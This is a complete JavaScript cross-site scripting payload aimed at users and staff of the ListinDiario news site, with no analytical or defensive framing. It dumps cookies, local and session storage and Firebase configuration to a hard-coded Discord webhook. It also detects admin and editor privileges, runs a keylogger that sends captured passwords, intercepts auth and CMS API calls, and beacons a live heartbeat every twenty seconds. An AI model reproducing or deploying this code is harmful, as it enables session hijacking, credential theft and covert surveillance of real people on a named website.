(async function() {
    const WEBHOOK = 'https://discord.com/api/webhooks/1483674310894686218/4vfFs_gCMSHonr7AGWKf4yqgoE9DSuaTot7XhXemDE6o5b8GQWraBbk7qbY5S9G2VDST';

    const exfil = async (data, alertType = 'info') => {
        const embeds = [{
            title: `${alertType.toUpperCase()} - ListinDiario XSS Victim`,
            description: data.summary || 'Live session active',
            color: alertType === 'high' ? 16711680 : alertType === 'medium' ? 16776960 : 3447003,
            fields: [
                { name: 'Timestamp', value: new Date().toISOString(), inline: true },
                { name: 'URL', value: location.href.slice(0, 100), inline: true },
                { name: 'Cookies', value: (data.cookies || 'none').slice(0, 500), inline: false }
            ],
            timestamp: new Date().toISOString()
        }];
        if (data.privileges) embeds[0].fields.push({ name: 'Privileges', value: data.privileges, inline: false });
        await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds }), keepalive: true });
    };

    // TARGETED PRIVILEGE DETECTION for ListinDiario stack
    const checkPrivileges = () => {
        const indicators = {
            high: [
                // Firebase auth/admin
                localStorage.getItem('firebase:authUser') || sessionStorage.getItem('firebase:authUser'),
                document.cookie.match(/(flip-pay|marfeel|gravitec)_admin|staff|editor|mod/i),
                location.href.match(/\/admin|\/dashboard|\/editor|\/cms|\/panel|\/manage/i),
                // Backbone user models
                window.app?.user?.get('role')?.match(/admin|editor|staff/i),
                window.user?.role?.match(/admin|editor/i)
            ],
            medium: [
                // Staff hints
                document.querySelector('[href*="flip-pay"], [href*="marfeel"], [href*="gravitec/admin"]'),
                localStorage.getItem('user_type') || sessionStorage.getItem('user_type'),
                document.body.innerHTML.match(/Editor|Administrador|Staff|Moderar/i),
                // Flip-Pay (payment processor) staff
                document.cookie.includes('flip-pay_session')
            ],
            firebase: !!window.firebase  // Firebase presence
        };

        const privLevel = indicators.high.some(Boolean) ? 'high' : 
                         indicators.medium.some(Boolean) ? 'medium' : 'user';

        exfil({ 
            privileges: privLevel, 
            firebase_detected: indicators.firebase,
            storage_keys: Object.keys(localStorage).join(', '),
            summary: `Priv: ${privLevel}`
        }, privLevel);

        return privLevel;
    };

    // Initial full dump
    const initial = {
        cookies: document.cookie,
        localStorage: Object.fromEntries(Object.entries(localStorage)),
        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
        backbone_models: !!window.Backbone ? Object.keys(window.Backbone.Models || {}).join(', ') : 'none',
        firebase_config: window.firebase?.app()?.options || 'none'
    };
    await exfil(initial);
    checkPrivileges();

    // Keylogger (creds + commands)
    let keys = [];
    document.addEventListener('keydown', e => {
        keys.push(e.key);
        const recent = keys.slice(-15).join('').toLowerCase();
        if (recent.match(/(admin|editor|pass|clave|login|firebase)/) || keys.length > 40) {
            exfil({ keystrokes: keys.join('') }, 'medium');
            keys = [];
        }
    });

    // Firebase/Flip-Pay specific intercepts
    const origFetch = window.fetch;
    window.fetch = async (...args) => {
        const url = args[0];
        // Firebase, Flip-Pay, Marfeel admin APIs
        if (url.match(/firebase|flip-pay|marfeel|gravitec|\/api\/auth|\/cms/)) {
            exfil({ api_hit: url.href || url, method: args[1]?.method }, 'high');
        }
        return origFetch.apply(this, args);
    };

    // Live heartbeat + priv recheck
    setInterval(async () => {
        await exfil({ 
            heartbeat: '🔴 LIVE', 
            cookies: document.cookie,
            current_priv: checkPrivileges()
        });
    }, 20000);

    // SPA navigation (Backbone router)
    let lastPath = location.pathname;
    setInterval(() => {
        if (location.pathname !== lastPath) {
            lastPath = location.pathname;
            checkPrivileges();
        }
    }, 2000);

    console.log('🚀 ListinDiario Listener v2 - Firebase/Backbone Optimized');
})();
